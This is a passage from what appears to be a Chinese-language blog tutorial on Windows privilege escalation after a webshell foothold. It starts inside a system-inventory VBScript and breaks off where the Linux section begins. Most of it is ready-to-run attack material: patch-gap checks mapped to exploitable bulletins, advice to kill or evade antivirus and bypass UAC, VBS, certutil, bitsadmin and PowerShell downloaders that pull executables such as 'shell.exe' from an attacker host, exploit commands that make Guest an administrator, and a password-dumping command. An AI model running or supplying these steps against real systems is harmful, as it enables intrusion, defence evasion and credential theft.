class="string">"winmgmts:\" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=<span class="literal">TRUE</span><span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    If isNULL(objItem.DNSServerSearchOrder) Then</span></span><br><span class="line"><span class="string">    Else</span></span><br><span class="line"><span class="string">        IPX=objItem.IPAddress(0)</span></span><br><span class="line"><span class="string">        LefIP=split(IPX,"</span>.<span class="string">")(0)</span></span><br><span class="line"><span class="string">        If LefIP="</span><span class="number">10</span><span class="string">" OR LefIP="</span><span class="number">192</span><span class="string">" Then</span></span><br><span class="line"><span class="string">           IP=IPX</span></span><br><span class="line"><span class="string">           Wscript.Echo "</span>ip:<span class="string">" &amp; IP</span></span><br><span class="line"><span class="string">        End If</span></span><br><span class="line"><span class="string">    End If</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取SN号'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_BIOS<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    SN=objItem.SerialNumber</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>Sn: <span class="string">" &amp; SN</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取CPU信息'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_Processor<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Processor=objItem.Name</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>Processors:         <span class="string">" &amp; Processor</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取内存信息'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_ComputerSystem<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Memory= Round(objItem.TotalPhysicalMemory/1024^3) &amp; "</span>GB<span class="string">"</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>Memory: <span class="string">" &amp; Memory</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取硬盘信息'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_DiskDrive<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Disk=objItem.Model</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>Disk:         <span class="string">" &amp; Disk</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取电脑品牌'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_BaseBoard<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Pinpai=objItem.Manufacturer</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取Summary信息'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_BaseBoard<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Product=objItem.Product</span></span><br><span class="line"><span class="string">    Summary=Pinpai &amp; "</span> <span class="string">" &amp; Product &amp; "</span>,<span class="string">" &amp; Processor &amp; "</span>,<span class="string">" &amp; Memory</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>Summary: <span class="string">" &amp; Summary</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取Chipset信息'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_Processor<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Chipset=objItem.Caption</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>Chipset:         <span class="string">" &amp; Chipset</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取系统类型'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_OperatingSystem<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    OS=objItem.Caption</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>OS: <span class="string">" &amp; OS</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取BIOS信息'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_BIOS<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    If isNull(objItem.BIOSVersion) Then</span></span><br><span class="line"><span class="string">        Wscript.Echo "</span>BIOS: <span class="string">"</span></span><br><span class="line"><span class="string">    Else</span></span><br><span class="line"><span class="string">        BIOS=Join(objItem.BIOSVersion,"</span>,<span class="string">")</span></span><br><span class="line"><span class="string">        Wscript.Echo "</span>BIOS: <span class="string">" &amp; BIOS</span></span><br><span class="line"><span class="string">    End If</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取计算机名'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_ComputerSystem<span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Hostname=objItem.DNSHostName</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>Hostname:<span class="string">" &amp; Hostname</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取MAC地址'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_NetworkAdapterConfiguration WHERE  IPEnabled = <span class="literal">True</span><span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Macaddress=objItem.MACAddress</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>MACAddress: <span class="string">" &amp; Macaddress</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REM '获取Network信息'</span></span><br><span class="line"><span class="string">strComputer = "</span>.<span class="string">"</span></span><br><span class="line"><span class="string">Set objWMIService = GetObject("</span>winmgmts:\<span class="string">" &amp; strComputer &amp; "</span>rootCIMV2<span class="string">")</span></span><br><span class="line"><span class="string">Set colItems = objWMIService.ExecQuery( _</span></span><br><span class="line"><span class="string">    "</span><span class="keyword">SELECT</span> * FROM Win32_NetworkAdapterConfiguration WHERE  IPEnabled = <span class="literal">True</span><span class="string">",,48)</span></span><br><span class="line"><span class="string">For Each objItem in colItems</span></span><br><span class="line"><span class="string">    Network=Mid(objItem.Caption,InStr(objItem.Caption,"</span>]<span class="string">")+1) &amp; "</span> <span class="string">" &amp; Macaddress</span></span><br><span class="line"><span class="string">    Wscript.Echo "</span>Network: <span class="string">" &amp; Network</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Dim Info</span></span><br><span class="line"><span class="string">Info="</span>Summary: <span class="string">" &amp; Summary &amp; Chr(13) &amp; "</span>Processors: <span class="string">" &amp; Processor &amp; Chr(13) &amp; "</span>Memory: <span class="string">" &amp; Memory &amp; Chr(13) &amp; "</span>Disk: <span class="string">" &amp; Disk &amp; Chr(13) &amp; "</span>Chipset: <span class="string">" &amp; Chipset &amp; Chr(13) &amp; "</span>Network: <span class="string">" &amp; Network &amp; Chr(13) &amp; "</span>BIOS: <span class="string">" &amp; BIOS</span></span><br><span class="line"><span class="string">MsgBox(Info)</span></span><br></pre></td></tr></table></figure><p>根据已知补丁，寻找对应的漏洞和POC或EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;C:\Windows\Temp\temp.txt&amp;(for %i in (KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171 KB2829361 KB3000061 KB2850851 KB2707511</span><br><span class="line">KB970483 KB2124261 KB2271195 ) do @type C:\Windows\Temp\temp.txt|@find /i &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a C:\Windows\Temp\temp.txt</span><br></pre></td></tr></table></figure><p>对照表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">KB2360937 MS10-084</span><br><span class="line">KB2478960 MS11-014</span><br><span class="line">KB2507938 MS11-056</span><br><span class="line">KB2566454 MS11-062</span><br><span class="line">KB2646524 MS12-003</span><br><span class="line">KB2645640 MS12-009</span><br><span class="line">KB2641653 MS12-018</span><br><span class="line">KB944653 MS07-067</span><br><span class="line">KB952004 MS09-012 PR</span><br><span class="line">KB971657 MS09-041</span><br><span class="line">KB2620712 MS11-097</span><br><span class="line">KB2393802 MS11-011</span><br><span class="line">kb942831 MS08-005</span><br><span class="line">KB2503665 MS11-046</span><br><span class="line">KB2592799 MS11-080</span><br><span class="line">KB956572 MS09-012 烤肉</span><br><span class="line">KB2621440 MS12-020</span><br><span class="line">KB977165 MS10-015 Ms Viru</span><br><span class="line">KB3124280 MS16-032</span><br><span class="line">KB3143141 MS16-016</span><br><span class="line">KB3134228 MS16-014</span><br><span class="line">KB3079904 MS15-097</span><br><span class="line">KB3077657 MS15-077</span><br><span class="line">KB3045171 MS15-051</span><br><span class="line">KB3000061 MS14-058</span><br><span class="line">KB2829361 MS13-046</span><br><span class="line">KB2850851 MS13-053 EPATHOBJ 0day（限32位）</span><br><span class="line">KB2707511 MS12-042 sysret -pid</span><br><span class="line">KB2124261 KB2271195 MS10-065 IIS7</span><br><span class="line">KB970483 MS09-020 IIS6</span><br></pre></td></tr></table></figure><p><strong>针对系统的分析脚本</strong></p><p>WinSystemHelper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">github clone https://github.com/brianwrf/WinSystemHelper</span><br><span class="line">.\WinSysHelper.bat</span><br></pre></td></tr></table></figure><p>Windows-Exploit-Suggester</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">github clone https://github.com/GDSSecurity/Windows-Exploit-Suggester</span><br><span class="line">#更新</span><br><span class="line">python2 .\windows-exploit-suggester.py -u </span><br><span class="line">#系统信息</span><br><span class="line">systeminfo &gt; win10.txt</span><br><span class="line">#进行分析</span><br><span class="line">python2 .\windows-exploit-suggester.py -d .\2019-07-05-mssb.xls -i win10.txt</span><br></pre></td></tr></table></figure><p><strong>3. 准备提权0day及其他提权工具</strong></p><ul><li>针对操作系统对应位数的提权0day</li><li>针对系统应用程序的提权0day</li><li>准备获取密码的Hash工具</li><li>对0day和相关工具进行免杀处理和测试</li></ul><ol><li><p>收集可利用POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/</span><br><span class="line">www.expku.com</span><br><span class="line">https://www.rapid7.com/db/?type=metasploit</span><br><span class="line">0day.today</span><br><span class="line">github.com</span><br><span class="line">google.com</span><br></pre></td></tr></table></figure></li><li><p>编译利用poc</p><p>.exe （1）双击运行(whoami-system;执行添加管理员用户)（2）poc.exe “commond”</p></li><li><p>关闭或者绕过杀软</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net stop</span><br><span class="line">sc config</span><br><span class="line">sc delete</span><br><span class="line">加壳</span><br><span class="line">绕过UAC</span><br><span class="line">第三方</span><br></pre></td></tr></table></figure></li></ol><p><strong>4. 寻找服务器可写目录</strong></p><h3 id="2-开始提权"><a href="#2-开始提权" class="headerlink" title="2. 开始提权"></a>2. 开始提权</h3><p><strong>1. 上传或下载提权0day及其他提权工具</strong></p><p>上传方式：</p><ul><li>webshell</li><li>FTP</li><li>下载命令</li></ul><p>将工具上传到可写目录下</p><p>压缩工具包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAR.EXE a -k -r -s -m3 C:\1.rar  G:\phpStudy</span><br></pre></td></tr></table></figure><p>下载方法：</p><ul><li><p>浏览器下载</p></li><li><p>wget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://domain/shell.txt</span><br></pre></td></tr></table></figure></li><li><p>使用vbs下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Sub download(url,target)</span><br><span class="line">Const adTypeBinary = 1</span><br><span class="line">Const adSaveCreateOverWrite = 2</span><br><span class="line">Dim http,ado</span><br><span class="line">Set http = CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">http.open &quot;GET&quot;,url,False</span><br><span class="line">http.send</span><br><span class="line">Set ado = createobject(&quot;Adodb.Stream&quot;)</span><br><span class="line">ado.Type = adTypeBinary</span><br><span class="line">ado.Open</span><br><span class="line">ado.Write http.responseBody</span><br><span class="line">ado.SaveToFile target</span><br><span class="line">ado.Close</span><br><span class="line">End Sub</span><br><span class="line">download &quot;http://www.baidu.com/index.html&quot;,&quot;index.html&quot;</span><br><span class="line"></span><br><span class="line">iLocal=LCase(Wscript.Arguments(1))</span><br><span class="line">iRemote=LCase(Wscript.Arguments(0))</span><br><span class="line">Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">xPost.Open &quot;GET&quot;,iRemote,0</span><br><span class="line">xPost.Send()</span><br><span class="line">set sGet=createObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">sGet.Mode=3</span><br><span class="line">sGet.Type=1</span><br><span class="line">sGet.Open()</span><br><span class="line">sGet.Write xPost.ResponseBody</span><br><span class="line">sGet.SaveToFile iLocal,2</span><br><span class="line"></span><br><span class="line">#带密码</span><br><span class="line">on error resume next</span><br><span class="line">iLocal=LCase(Wscript.Arguments(1))</span><br><span class="line">iRemote=LCase(Wscript.Arguments(0))</span><br><span class="line">iUser=LCase(Wscript.Arguments(2))</span><br><span class="line">iPass=LCase(Wscript.Arguments(3))</span><br><span class="line">set xPost=CreateObject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">if iUser=&quot;&quot; and iPass=&quot;&quot; then</span><br><span class="line">xPost.Open &quot;GET&quot;,iRemote,0</span><br><span class="line">else</span><br><span class="line">xPost.Open &quot;GET&quot;,iRemote,0,iUser,iPass</span><br><span class="line">end if</span><br><span class="line">xPost.Send()</span><br><span class="line">set sGet=CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">sGet.Mode=3</span><br><span class="line">sGet.Type=1</span><br><span class="line">sGet.Open()</span><br><span class="line">sGet.Write xPost.ResponseBody</span><br><span class="line">sGet.SaveToFile iLocal,2</span><br></pre></td></tr></table></figure><p>使用命令，将ma.exe保存到c盘根目录下，不写路径会显示程序执行出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript down.vbs http://www.jbzj.com/ma.exe c:/ma.exe</span><br><span class="line">cscript wget.vbs http://www.jbzj.com/ma.exe</span><br></pre></td></tr></table></figure><p>固定下载程序位置和名称并下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://www.antian365.com /ma.exe&quot;#网络文件地址</span><br><span class="line">saveas=&quot;c:\ma.exe&quot;#保存的本地文件</span><br><span class="line">Set xmlhttp = CreateObject(&quot;Microsoft.XMLHTTP&quot;)#创建HTTP请求对象</span><br><span class="line">set sGet=CreateObject(&quot;ADODB.Stream&quot;)#创建ADO数据流对象</span><br><span class="line">Call xmlhttp.open(&quot;GET&quot;,url,False)#打开链接</span><br><span class="line">Call xmlhttp.send()#发送请求</span><br><span class="line">stream.mode = 3#设置数据流为读写模式</span><br><span class="line">stream.type = 1#设置数据流为二进制模式</span><br><span class="line">Call stream.open()#打开数据流</span><br><span class="line">Call stream.write(xmlhttp.responsebody)#将服务器返回报文主体内容写入数据流</span><br><span class="line">Call stream.savetofile(saveas,2)#将数据流保存为文件</span><br><span class="line">Set xmlhttp = Nothing</span><br><span class="line">Set stream = Nothing</span><br></pre></td></tr></table></figure><p>保存为down.vbs文件，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csript down.vbs</span><br></pre></td></tr></table></figure><p>还有一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Set xmlhttp = CreateObject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">xPost.Open &quot;GET&quot;,&quot;http://www.antian365.com/ma.exe&quot;,0</span><br><span class="line">xPost.Send()</span><br><span class="line">set sGet=CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">sGet.Mode=3</span><br><span class="line">sGet.Type=1</span><br><span class="line">sGet.Open()</span><br><span class="line">sGet.Write(xPost.ResponseBody)</span><br><span class="line">sGet.saveToFile &quot;c:\2.exe&quot;,2</span><br></pre></td></tr></table></figure><p>bat模式下执行vbs下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo Set xPost = createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;1.vbs </span><br><span class="line">echo xPost.Open &quot;GET&quot;,http://www.xxx.com/help.exe,0 &gt;&gt;1.vbs </span><br><span class="line">echo xPost.Send() &gt;&gt;1.vbs </span><br><span class="line">echo Set sGet = createObject(&quot;ADODB.Stream&quot;) &gt;&gt;1.vbs </span><br><span class="line">echo sGet.Mode = 3 &gt;&gt;1.vbs </span><br><span class="line">echo sGet.Type = 1 &gt;&gt;1.vbs </span><br><span class="line">echo sGet.Open() &gt;&gt;1.vbs </span><br><span class="line">echo sGet.Write(xPost.responseBody) &gt;&gt;1.vbs </span><br><span class="line">echo sGet.SaveToFile &quot;c:/help.exe&quot;,2 &gt;&gt;1.vbs</span><br></pre></td></tr></table></figure></li><li><p>证书备份下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://hackerserver/shell.exe shell.exe</span><br></pre></td></tr></table></figure></li><li><p>使用bitsadmin命令下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myjob1 /download /priority normal http://antian365.com/psexec.exe c:\psexec.exe#带进度条</span><br><span class="line"></span><br><span class="line">bitsadmin /rawreturn /transfer getfile http://sysinternals.com/files/RSTools.zip c:\p.zip</span><br><span class="line"></span><br><span class="line">bitsadmin /rawreturn /transfer getpayload http://sysinternals.com/files/RSTools.zip c:p.zip</span><br><span class="line"></span><br><span class="line">bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://sysinternals.com/files/RSTools.zip&quot; &quot;c:\p.zip&quot;</span><br><span class="line">#建立任务</span><br><span class="line">bitsadmin /create myDownloadJob</span><br><span class="line">bitsadmin /addfile myDownloadJob http://url c:lcx.zip</span><br><span class="line">bitsadmin /resume myDownloadJob</span><br><span class="line">bitsadmin /info myDownloadJob /verbose</span><br><span class="line">bitsadmin /complete myDownloadJob</span><br><span class="line"></span><br><span class="line">bitsadmin /list /allusers /verbose#如果列所有用户需管理员权限</span><br><span class="line">bitsadmin /cancel myDownloadJob#删除某个任务</span><br><span class="line">#代理下载</span><br><span class="line">bitsadmin /util /setIEproxy localsystem MANUAL_PROXY 10.1.1.20:8080 &quot;local&quot;</span><br><span class="line">Bitsadmin /util /getIEproxy localservice#显示代理</span><br><span class="line">bitsadmin /util /setIEproxy localservice NO_PROXY#取消代理</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://www.baidu.com/index.html&quot;,&quot;index.html&quot;)</span><br></pre></td></tr></table></figure></li><li><p>在FTP命令模式下下载</p><p>down.bat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@set temp=c:\script.txt</span><br><span class="line">echo open 10.229.23.77&gt;&gt;%temp%</span><br><span class="line">echo ftpuser&gt;&gt;%temp%</span><br><span class="line">echo ftpuser&gt;&gt;%temp%</span><br><span class="line">echo cd General&gt;&gt;%temp%</span><br><span class="line">echo lcd %2&gt;&gt;%temp%</span><br><span class="line">echo get %1&gt;&gt;%temp%</span><br><span class="line">echo quit&gt;&gt;%temp%</span><br><span class="line">@ftp -s:%temp%</span><br><span class="line">del %temp%</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diwn.bat filename c:\</span><br></pre></td></tr></table></figure></li></ul><p><strong>2. 执行0day进行提权尝试</strong></p><p>在WebShell状态下执行提权0day，通常通过0day添加普通用户为管理员，或者执行其他可执行程序（木马、系统密码获取工具等）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp.exe &quot;net user Guest /active:yes&quot;</span><br><span class="line">exp.exe &quot;net user Guest 123&quot;</span><br><span class="line">exp.exe &quot;net localgroup Administrator Guest /add&quot;</span><br></pre></td></tr></table></figure><p><strong>3. 获取系统权限及操作系统的密码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce -w</span><br></pre></td></tr></table></figure><h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><h3 id="1-信息收集-1"><a href="#1-信息收集-1" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><ul><li><p>操作系统版本号（发行版本、内核版本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 